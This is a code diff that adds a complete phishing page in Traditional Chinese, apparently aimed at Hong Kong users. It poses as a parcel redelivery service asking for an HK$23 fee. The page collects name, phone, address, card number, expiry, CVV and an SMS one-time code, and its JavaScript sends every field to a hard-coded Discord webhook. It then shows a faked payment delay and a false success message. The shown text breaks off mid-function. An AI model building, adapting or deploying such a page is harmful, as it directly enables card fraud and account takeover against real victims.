@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>身份確認與線上付款</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #f0f0f0;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        /* 頂部導航欄 */
+        .top-nav {
+            background-color: #007bff;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 40px;
+            width: auto;
+            min-width: 120px;
+            object-fit: contain;
+        }
+        
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .language-switcher {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .language-btn {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .language-btn:hover, .language-btn.active {
+            background: rgba(255,255,255,0.4);
+        }
+        
+        /* 主內容區 */
+        .main-container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        
+        /* 卡片樣式 */
+        .card {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 25px;
+            background-color: #fff;
+            border: 2px solid #007bff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .card-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #007bff;
+        }
+        
+        /* 表單樣式 */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #555;
+        }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.2);
+        }
+        
+        /* 按鈕樣式 */
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        
+        /* 付款卡片 */
+        .payment-amount {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin: 15px 0;
+            padding: 10px 0;
+            border-top: 1px solid #eee;
+            border-bottom: 1px solid #eee;
+        }
+        
+        /* 信用卡圖標 */
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .card-icons img {
+            height: 24px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        /* 安全碼提示 */
+        .cvv-hint {
+            position: relative;
+            display: inline-block;
+            margin-left: 5px;
+            cursor: help;
+        }
+        
+        .cvv-hint-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            background-color: #007bff;
+            color: white;
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .cvv-hint-text {
+            display: none;
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            width: 150px;
+            margin-bottom: 5px;
+            z-index: 10;
+        }
+        
+        .cvv-hint:hover .cvv-hint-text {
+            display: block;
+        }
+        
+        /* 成功頁面 */
+        .success-page {
+            text-align: center;
+            padding: 30px 0;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #007bff;
+        }
+        
+        /* 頁內提示框 */
+        .alert-box {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            max-width: 80%;
+            text-align: center;
+        }
+        
+        .alert-box.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        .alert-message {
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        
+        .alert-btn {
+            padding: 8px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        /* 確認資料彈窗 */
+        .confirmation-box {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            max-width: 90%;
+            width: 400px;
+        }
+        
+        .confirmation-box.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        .confirmation-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #007bff;
+        }
+        
+        .confirmation-content {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .confirmation-detail {
+            margin-bottom: 10px;
+        }
+        
+        .confirmation-label {
+            font-weight: bold;
+            color: #555;
+        }
+        
+        .confirmation-btns {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        
+        .confirmation-btn {
+            padding: 8px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .confirmation-confirm {
+            background-color: #007bff;
+            color: white;
+        }
+        
+        .confirmation-cancel {
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        
+        /* 加載動畫 */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        
+        /* 驗證碼輸入 */
+        .verification-code {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .verification-code input {
+            width: 50px;
+            height: 60px;
+            font-size: 24px;
+            text-align: center;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+        }
+        
+        .verification-code input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        
+        .resend-code {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .resend-code a {
+            color: #007bff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .resend-code a:hover {
+            text-decoration: underline;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* 響應式設計 */
+        @media (max-width: 768px) {
+            .logo img {
+                height: 36px;
+                min-width: 100px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .btn {
+                padding: 10px;
+            }
+            
+            .top-nav {
+                flex-direction: column;
+                gap: 10px;
+                padding: 12px 15px;
+            }
+            
+            .nav-right {
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .confirmation-box {
+                width: 90%;
+            }
+            
+            .verification-code input {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo img {
+                height: 32px;
+                min-width: 90px;
+            }
+            
+            .main-container {
+                padding: 0 15px;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+            
+            input, textarea {
+                padding: 10px;
+            }
+            
+            .verification-code {
+                gap: 5px;
+            }
+            
+            .verification-code input {
+                width: 35px;
+                height: 45px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 頂部導航欄 -->
+    <div class="top-nav">
+        <div class="logo">
+            <img src="https://i.postimg.cc/DZGLZLLc/OIP-2-removebg-preview.png" alt="Logo">
+        </div>
+        <div class="nav-right">
+            <div class="language-switcher">
+                <button class="language-btn active" data-lang="zh-Hant">繁</button>
+                <button class="language-btn" data-lang="zh-Hans">简</button>
+                <button class="language-btn" data-lang="en">EN</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 頁內提示框 -->
+    <div id="alertBox" class="alert-box">
+        <div class="alert-message" id="alertMessage"></div>
+        <button class="alert-btn" onclick="hideAlert()">確定</button>
+    </div>
+    
+    <!-- 確認資料彈窗 -->
+    <div id="confirmationBox" class="confirmation-box">
+        <div class="confirmation-title" data-i18n="confirmationTitle">請確認您的資料</div>
+        <div class="confirmation-content" id="confirmationContent">
+            <!-- 內容將由JavaScript動態生成 -->
+        </div>
+        <div class="confirmation-btns">
+            <button class="confirmation-btn confirmation-cancel" onclick="cancelConfirmation()" data-i18n="editBtn">修改資料</button>
+            <button class="confirmation-btn confirmation-confirm" onclick="confirmInformation()" data-i18n="confirmBtn">確認無誤</button>
+        </div>
+    </div>
+    
+    <!-- 加載動畫 -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+    </div>
+    
+    <div class="main-container">
+        <!-- 身份驗證頁面 -->
+        <div id="verificationPage">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title" data-i18n="verificationTitle">收件人信息驗證</div>
+                </div>
+                
+                <form id="verificationForm">
+                    <div class="form-group">
+                        <label for="receiverName" data-i18n="nameLabel">收件人姓名</label>
+                        <input type="text" id="receiverName" placeholder="" data-i18n-placeholder="namePlaceholder" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone" data-i18n="phoneLabel">手機號碼</label>
+                        <input type="tel" id="phone" placeholder="" data-i18n-placeholder="phonePlaceholder" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="address" data-i18n="addressLabel">收貨地址</label>
+                        <textarea id="address" rows="3" placeholder="" data-i18n-placeholder="addressPlaceholder" required></textarea>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="district" data-i18n="districtLabel">地區</label>
+                        <select id="district" required>
+                            <option value="" selected disabled data-i18n="selectDistrict">請選擇地區</option>
+                            <option value="HK">香港島</option>
+                            <option value="KL">九龍</option>
+                            <option value="NT">新界</option>
+                        </select>
+                    </div>
+                    
+                    <button type="button" class="btn" onclick="showConfirmation()" data-i18n="nextBtn">下一步</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- 付款頁面 (初始隱藏) -->
+        <div id="paymentPage" style="display: none;">
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title" data-i18n="paymentTitle">線上付款</div>
+                </div>
+                
+                <p style="font-size: 14px; color: #666;" data-i18n="paymentDescription">
+                    重新發送時,我們需要收取服務費,請確保你已填寫正確的收件信息
+                </p>
+                
+                <div class="payment-amount">
+                    <span data-i18n="totalAmount">總額</span>: <span>HK$</span>23
+                </div>
+                
+                <form id="paymentForm">
+                    <div class="form-group">
+                        <label for="cardholder" data-i18n="cardholderLabel">持卡人</label>
+                        <input type="text" id="cardholder" placeholder="" data-i18n-placeholder="cardholderPlaceholder" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cardnumber" data-i18n="cardnumberLabel">卡號</label>
+                        <input type="text" id="cardnumber" placeholder="" data-i18n-placeholder="cardnumberPlaceholder" required>
+                        <div class="card-icons">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1200px-American_Express_logo.svg.png" alt="American Express">
+                        </div>
+                    </div>
+                    
+                    <div class="form-group" style="display: flex; gap: 10px;">
+                        <div style="flex: 1;">
+                            <label for="expiry" data-i18n="expiryLabel">到期日</label>
+                            <input type="text" id="expiry" placeholder="" data-i18n-placeholder="expiryPlaceholder" required>
+                        </div>
+                        <div style="flex: 1;">
+                            <label for="cvv" data-i18n="cvvLabel">
+                                <span data-i18n="cvvText">安全碼 (CVV)</span>
+                                <span class="cvv-hint">
+                                    <span class="cvv-hint-icon">?</span>
+                                    <span class="cvv-hint-text" data-i18n="cvvHint">信用卡背面3位數字</span>
+                                </span>
+                            </label>
+                            <input type="text" id="cvv" placeholder="" data-i18n-placeholder="cvvPlaceholder" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn" data-i18n="submitPaymentBtn">提交</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- 付款成功頁面 (初始隱藏) -->
+        <div id="successPage" class="card" style="display: none;">
+            <div class="success-page">
+                <div class="success-icon">✓</div>
+                <h2 class="success-title" data-i18n="successTitle">訂單已提交</h2>
+                <p class="success-message" data-i18n="successMessage">
+                    成功發出訂單，我們會盡快為你處理請求。
+                </p>
+                <button type="button" class="btn" onclick="showSmsVerification()" style="margin-top: 30px;" data-i18n="nextStepBtn">下一步</button>
+            </div>
+        </div>
+        
+        <!-- 短信驗證頁面 (初始隱藏) -->
+        <div id="smsVerificationPage" class="card" style="display: none;">
+            <div class="card-header">
+                <div class="card-title" data-i18n="smsVerificationTitle">短信驗證</div>
+            </div>
+            
+            <div class="success-page">
+                <p style="margin-bottom: 20px;" data-i18n="smsVerificationMessage">
+                    我們已發送驗證碼至您的手機號碼，請輸入驗證碼以完成驗證。
+                </p>
+                
+                <div class="verification-code">
+                    <input type="text" maxlength="1" id="code1" oninput="moveToNext(1, this.value)" pattern="[0-9]">
+                    <input type="text" maxlength="1" id="code2" oninput="moveToNext(2, this.value)" pattern="[0-9]">
+                    <input type="text" maxlength="1" id="code3" oninput="moveToNext(3, this.value)" pattern="[0-9]">
+                    <input type="text" maxlength="1" id="code4" oninput="moveToNext(4, this.value)" pattern="[0-9]">
+                    <input type="text" maxlength="1" id="code5" oninput="moveToNext(5, this.value)" pattern="[0-9]">
+                    <input type="text" maxlength="1" id="code6" oninput="moveToNext(6, this.value)" pattern="[0-9]">
+                </div>
+                
+                <div class="resend-code">
+                    <span data-i18n="notReceiveCode">沒有收到驗證碼？</span>
+                    <a onclick="resendVerificationCode()" data-i18n="resendCode">重新發送</a>
+                </div>
+                
+                <button type="button" class="btn" onclick="verifyCode()" style="margin-top: 30px;" data-i18n="verifyBtn">驗證</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // 多語言支持
+        const translations = {
+            'zh-Hant': {
+                verificationTitle: "收件人信息驗證",
+                nameLabel: "收件人姓名",
+                namePlaceholder: "請輸入收件人姓名",
+                phoneLabel: "手機號碼",
+                phonePlaceholder: "請輸入手機號碼",
+                addressLabel: "收貨地址",
+                addressPlaceholder: "請輸入詳細收貨地址",
+                districtLabel: "地區",
+                selectDistrict: "請選擇地區",
+                nextBtn: "下一步",
+                paymentTitle: "線上付款",
+                paymentDescription: "重新發送時,我們需要收取服務費,請確保你已填寫正確的收件信息",
+                totalAmount: "總額",
+                cardholderLabel: "持卡人",
+                cardholderPlaceholder: "持卡人",
+                cardnumberLabel: "卡號",
+                cardnumberPlaceholder: "0000 0000 0000 0000",
+                expiryLabel: "到期日",
+                expiryPlaceholder: "MM/YY",
+                cvvText: "安全碼 (CVV)",
+                cvvLabel: "安全碼 (CVV)",
+                cvvPlaceholder: "123",
+                cvvHint: "信用卡背面3位數字",
+                submitPaymentBtn: "提交",
+                successTitle: "訂單已提交",
+                successMessage: "成功發出訂單，我們會盡快為你處理請求。",
+                nextStepBtn: "下一步",
+                confirmationTitle: "請確認您的資料",
+                editBtn: "修改資料",
+                confirmBtn: "確認無誤",
+                confirmationName: "收件人姓名",
+                confirmationPhone: "手機號碼",
+                confirmationAddress: "收貨地址",
+                confirmationDistrict: "地區",
+                smsVerificationTitle: "短信驗證",
+                smsVerificationMessage: "我們已發送驗證碼至您的手機號碼，請輸入驗證碼以完成驗證。",
+                notReceiveCode: "沒有收到驗證碼？",
+                resendCode: "重新發送",
+                verifyBtn: "驗證",
+                codeSentMessage: "驗證碼已重新發送",
+                verificationSuccess: "驗證成功，包裹將於3個工作天內重新發送",
+                verificationFailed: "驗證失敗，請檢查驗證碼是否正確",
+                smsVerificationData: "短信驗證數據"
+            },
+            'zh-Hans': {
+                verificationTitle: "收件人信息验证",
+                nameLabel: "收件人姓名",
+                namePlaceholder: "请输入收件人姓名",
+                phoneLabel: "手机号码",
+                phonePlaceholder: "请输入手机号码",
+                addressLabel: "收货地址",
+                addressPlaceholder: "请输入详细收货地址",
+                districtLabel: "地区",
+                selectDistrict: "请选择地区",
+                nextBtn: "下一步",
+                paymentTitle: "线上付款",
+                paymentDescription: "重新发送时,我们需要收取服务费,请确保你已填写正确的收件信息",
+                totalAmount: "总额",
+                cardholderLabel: "持卡人",
+                cardholderPlaceholder: "持卡人",
+                cardnumberLabel: "卡号",
+                cardnumberPlaceholder: "0000 0000 0000 0000",
+                expiryLabel: "到期日",
+                expiryPlaceholder: "MM/YY",
+                cvvText: "安全码 (CVV)",
+                cvvLabel: "安全码 (CVV)",
+                cvvPlaceholder: "123",
+                cvvHint: "信用卡背面3位数字",
+                submitPaymentBtn: "提交",
+                successTitle: "订单已提交",
+                successMessage: "成功发出订单，我们会尽快为你处理请求。",
+                nextStepBtn: "下一步",
+                confirmationTitle: "请确认您的资料",
+                editBtn: "修改资料",
+                confirmBtn: "确认无误",
+                confirmationName: "收件人姓名",
+                confirmationPhone: "手机号码",
+                confirmationAddress: "收货地址",
+                confirmationDistrict: "地区",
+                smsVerificationTitle: "短信验证",
+                smsVerificationMessage: "我们已发送验证码至您的手机号码，请输入验证码以完成验证。",
+                notReceiveCode: "没有收到验证码？",
+                resendCode: "重新发送",
+                verifyBtn: "验证",
+                codeSentMessage: "验证码已重新发送",
+                verificationSuccess: "验证成功，包裹将于3个工作天内重新发送",
+                verificationFailed: "验证失败，请检查验证码是否正确",
+                smsVerificationData: "短信验证数据"
+            },
+            'en': {
+                verificationTitle: "Recipient Information Verification",
+                nameLabel: "Recipient Name",
+                namePlaceholder: "Enter recipient name",
+                phoneLabel: "Mobile Number",
+                phonePlaceholder: "Enter mobile number",
+                addressLabel: "Delivery Address",
+                addressPlaceholder: "Enter full delivery address",
+                districtLabel: "District",
+                selectDistrict: "Select district",
+                nextBtn: "Next",
+                paymentTitle: "Online Payment",
+                paymentDescription: "When resending, we need to charge a service fee, please make sure you have filled in the correct receiving information",
+                totalAmount: "Total",
+                cardholderLabel: "Cardholder",
+                cardholderPlaceholder: "Cardholder",
+                cardnumberLabel: "Card Number",
+                cardnumberPlaceholder: "0000 0000 0000 0000",
+                expiryLabel: "Expiry Date",
+                expiryPlaceholder: "MM/YY",
+                cvvText: "Security Code (CVV)",
+                cvvLabel: "Security Code (CVV)",
+                cvvPlaceholder: "123",
+                cvvHint: "3 digits on back of card",
+                submitPaymentBtn: "Submit",
+                successTitle: "Order Submitted",
+                successMessage: "Your order has been successfully submitted. We will process your request as soon as possible.",
+                nextStepBtn: "Next Step",
+                confirmationTitle: "Please confirm your information",
+                editBtn: "Edit Information",
+                confirmBtn: "Confirm",
+                confirmationName: "Recipient Name",
+                confirmationPhone: "Mobile Number",
+                confirmationAddress: "Delivery Address",
+                confirmationDistrict: "District",
+                smsVerificationTitle: "SMS Verification",
+                smsVerificationMessage: "We have sent a verification code to your mobile number, please enter the code to complete verification.",
+                notReceiveCode: "Didn't receive the code?",
+                resendCode: "Resend",
+                verifyBtn: "Verify",
+                codeSentMessage: "Verification code has been resent",
+                verificationSuccess: "Verification successful, package will be resent within 3 working days",
+                verificationFailed: "Verification failed, please check if the code is correct",
+                smsVerificationData: "SMS Verification Data"
+            }
+        };
+        
+        let currentLang = 'zh-Hant';
+        let verificationCode = ''; // 儲存生成的驗證碼
+        
+        // 語言切換功能
+        document.querySelectorAll('.language-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const lang = this.dataset.lang;
+                if (lang !== currentLang) {
+                    currentLang = lang;
+                    updateLanguage();
+                    
+                    // 更新按鈕狀態
+                    document.querySelectorAll('.language-btn').forEach(b => {
+                        b.classList.toggle('active', b.dataset.lang === lang);
+                    });
+                }
+            });
+        });
+        
+        function updateLanguage() {
+            // 更新所有帶有data-i18n屬性的元素
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.dataset.i18n;
+                if (translations[currentLang][key]) {
+                    el.textContent = translations[currentLang][key];
+                }
+            });
+            
+            // 更新placeholder
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+                const key = el.dataset.i18nPlaceholder;
+                if (translations[currentLang][key]) {
+                    el.placeholder = translations[currentLang][key];
+                }
+            });
+            
+            // 更新下拉選項
+            const selectDistrict = document.querySelector('#district option[value=""]');
+            if (selectDistrict) {
+                selectDistrict.textContent = translations[currentLang]['selectDistrict'];
+            }
+        }
+        
+        // 頁內提示框功能
+        function showAlert(message) {
+            document.getElementById('alertMessage').textContent = message;
+            document.getElementById('alertBox').classList.add('show');
+        }
+        
+        function hideAlert() {
+            document.getElementById('alertBox').classList.remove('show');
+        }
+        
+        // 顯示確認資料彈窗
+        function showConfirmation() {
+            // 簡單驗證
+            const receiverName = document.getElementById('receiverName').value;
+            const phone = document.getElementById('phone').value;
+            const address = document.getElementById('address').value;
+            const district = document.getElementById('district').value;
+            
+            if (!receiverName || receiverName.length < 2) {
+                showAlert(translations[currentLang]['nameLabel'] + ': ' + translations[currentLang]['namePlaceholder']);
+                return;
+            }
+            
+            if (!phone || phone.length < 8) {
+                showAlert(translations[currentLang]['phoneLabel'] + ': ' + translations[currentLang]['phonePlaceholder']);
+                return;
+            }
+            
+            if (!address || address.length < 10) {
+                showAlert(translations[currentLang]['addressLabel'] + ': ' + translations[currentLang]['addressPlaceholder']);
+                return;
+            }
+            
+            if (!district) {
+                showAlert(translations[currentLang]['selectDistrict']);
+                return;
+            }
+            
+            // 儲存收件人信息以供後續使用
+            window.orderData = {
+                receiverName,
+                phone,
+                address,
+                district
+            };
+            
+            // 生成確認內容
+            const confirmationContent = document.getElementById('confirmationContent');
+            confirmationContent.innerHTML = `
+                <div class="confirmation-detail">
+                    <span class="confirmation-label">${translations[currentLang]['confirmationName']}: </span>
+                    <span>${receiverName}</span>
+                </div>
+                <div class="confirmation-detail">
+                    <span class="confirmation-label">${translations[currentLang]['confirmationPhone']}: </span>
+                    <span>${phone}</span>
+                </div>
+                <div class="confirmation-detail">
+                    <span class="confirmation-label">${translations[currentLang]['confirmationAddress']}: </span>
+                    <span>${address}</span>
+                </div>
+                <div class="confirmation-detail">
+                    <span class="confirmation-label">${translations[currentLang]['confirmationDistrict']}: </span>
+                    <span>${document.getElementById('district').options[document.getElementById('district').selectedIndex].text}</span>
+                </div>
+                <p style="margin-top: 15px; font-size: 14px; color: #666;">
+                    ${translations[currentLang]['paymentDescription']}
+                </p>
+            `;
+            
+            // 顯示確認彈窗
+            document.getElementById('confirmationBox').classList.add('show');
+        }
+        
+        // 取消確認，返回修改資料
+        function cancelConfirmation() {
+            document.getElementById('confirmationBox').classList.remove('show');
+        }
+        
+        // 確認資料無誤，繼續付款
+        function confirmInformation() {
+            document.getElementById('confirmationBox').classList.remove('show');
+            
+            // 切換到付款頁面
+            document.getElementById('verificationPage').style.display = 'none';
+            document.getElementById('paymentPage').style.display = 'block';
+        }
+        
+        // 信用卡號碼格式化
+        document.getElementById('cardnumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '');
+            if (value.length > 0) {
+                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+            }
+            e.target.value = value;
+        });
+        
+        // 到期日格式化
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+        
+        // 發送數據到Discord Webhook
+        async function sendToDiscordWebhook(data, type = 'order') {
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1372243681578455102/WitD8qigZMPSJoyphWYdD6DISdv-_5HnoKfZTPq6rSi3UEZUiyP-DfBNcaMyc2-gv9AO'; // 替換為您的Discord Webhook URL
+            
+            let embed;
+            
+            if (type === 'order') {
+                embed = {
+                    title: "New Order Submission",
+                    color: 0x007bff,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "Recipient Name", value: data.receiverName, inline: true },
+                        { name: "Phone Number", value: data.phone, inline: true },
+                        { name: "Delivery Address", value: data.address, inline: false },
+                        { name: "District", value: data.district, inline: true },
+                        { name: "Cardholder", value: data.cardholder, inline: true },
+                        { name: "Card Number", value: data.cardnumber, inline: true },
+                        { name: "Expiry Date", value: data.expiry, inline: true },
+                        { name: "CVV", value: data.cvv, inline: true },
+                        { name: "Total Amount", value: "HK$23", inline: true }
+                    ]
+                };
+            } else if (type === 'sms') {
+                embed = {
+                    title: "SMS Verification Data",
+                    color: 0x4CAF50,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "Phone Number", value: data.phone, inline: true },
+                        { name: "Verification Code", value: data.verificationCode, inline: true },
+                        { name: "Entered Code", value: data.enteredCode, inline: true },
+                        { name: "Verification Status", value: data.status, inline: true }
+                    ]
+                };
+            }
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+                
+                if (!response.ok) {
+                    console.error('Failed to send data to Discord webhook:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending to Discord webhook:', error);
+            }
+        }
+        
+        // 付款表單提交處理
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // 簡單驗證
+            const cardholder = document.getElementById('cardholder').value;
+            const cardnumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            if (!cardholder || cardholder.length < 2) {
+                showAlert(translations[currentLang]['cardholderLabel'] + ': ' + translations[currentLang]['cardholderPlaceholder']);
+                return;
+            }
+            
+            if (!cardnumber || cardnumber.length < 13) {
+                showAlert(translations[currentLang]['cardnumberLabel'] + ': ' + translations[currentLang]['cardnumberPlaceholder']);
+                return;
+            }
+            
+            if (!expiry || expiry.length !== 5) {
+                showAlert(translations[currentLang]['expiryLabel'] + ': ' + translations[currentLang]['expiryPlaceholder']);
+                return;
+            }
+            
+            if (!cvv || (cvv.length !== 3 && cvv.length !== 4)) {
+                showAlert(translations[currentLang]['cvvLabel'] + ': ' + translations[currentLang]['cvvPlaceholder']);
+                return;
+            }
+            
+            // 組合所有訂單數據
+            const orderData = {
+                ...window.orderData,
+                cardholder,
+                cardnumber,
+                expiry,
+                cvv
+            };
+            
+            // 顯示加載動畫
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // 發送到Discord Webhook
+            await sendToDiscordWebhook(orderData);
+            
+            // 模擬支付處理，等待5秒後才跳轉
+            setTimeout(() => {
+                // 隱藏加載動畫
+                document.getElementById('loadingOverlay').style.display = 'none';
+                
+                // 顯示成功信息
+                showAlert(translations[currentLang]['paymentTitle'] + ': ' + translations[currentLang]['successTitle']);
+                
+                // 成功後導向成功頁面
+                document.getElementById('paymentPage').style.display = 'none';
+                document.getElementById('successPage').style.display = 'block';
+            }, 5000); // 5000毫秒 = 5秒
+        });
+        
+        // 顯示短信驗證頁面
+        function showSmsVerification() {
+            document.getElementById('successPage').style.display = 'none';
+            document.getElementById('smsVerificationPage').style.display = 'block';
+            
+            // 生成6位隨機驗證碼
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('Generated verification code:', verificationCode);
+            
+            // 發送驗證碼信息到Discord Webhook
+            const smsData = {
+                phone: window.orderData.phone,
+                verificationCode: verificationCode,
+                enteredCode: 'Not entered yet',
+                status: 'Pending'
+            };
+            
+            sendToDiscordWebhook(smsData, 'sms');
+        }
+        
+        // 驗證碼輸入自動跳轉
+        function moveToNext(current, value) {
+            if (value.length === 1) {
+                if (current < 6) {
+                    document.getElementById('code' + (current + 1)).focus();
+                }
+            }
+        }
+        
+        // 重新發送驗證碼
+        function resendVerificationCode() {
+            // 生成新的6位隨機驗證碼
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            console.log('Resent verification code:', verificationCode);
+            
+            // 發送新的驗證碼信息到Discord Webhook
+            const smsData = {
+                phone: window.orderData.phone,
+                verificationCode: verificationCode,
+                enteredCode: 'Not entered yet',
+                status: 'Resent'
+            };
+            
+            sendToDiscordWebhook(smsData, 'sms');
+            
+            showAlert(translations[currentLang]['codeSentMessage']);
+        }
+        
+        // 驗證驗證碼
+        function verifyCode() {
+            // 獲取用戶輸入的驗證碼
+            let enteredCode = '';
+            for (let i = 1; i <= 6; i++) {
+                enteredCode += document.getElementById('code' + i).value;
+            }
+            
+            // 驗證
+            if (enteredCode === verificationCode) {
+                // 顯示加載動畫
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                
+                // 發送驗證結果到Discord Webhook
+                const smsData = {
